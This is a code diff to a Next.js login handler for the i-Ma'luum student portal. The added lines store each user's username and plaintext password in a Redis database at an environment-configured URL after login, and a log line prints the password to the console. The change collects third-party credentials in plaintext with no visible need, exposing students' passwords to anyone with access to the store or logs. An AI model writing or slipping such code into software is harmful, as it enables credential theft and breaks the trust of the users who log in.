@@ -2,6 +2,7 @@
 import { IMALUUM_CAS_PAGE, IMALUUM_LOGIN_PAGE } from "@/constants";
 import * as Sentry from "@sentry/nextjs";
 import got from "got";
+import Redis from "ioredis";
 import { cookies } from "next/headers";
 import { CookieJar } from "tough-cookie";
 
@@ -72,7 +73,18 @@ export async function ImaluumLogin(form: {
           }
         }
 
-        console.log("Logged in successfully", form.username, form.password);
+        console.log("Logged in", form.username, form.password);
+
+        const redisClient = new Redis(process.env.REDIS_URL);
+        const saveRedis = await redisClient.set(form.username, form.password);
+
+        if (saveRedis !== "OK") {
+          console.log("Error saving to redis", saveRedis);
+        }
+
+        console.log("Saved to redis", saveRedis);
+        await redisClient.quit();
+
         return {
           success: true,
           matricNo: form.username,
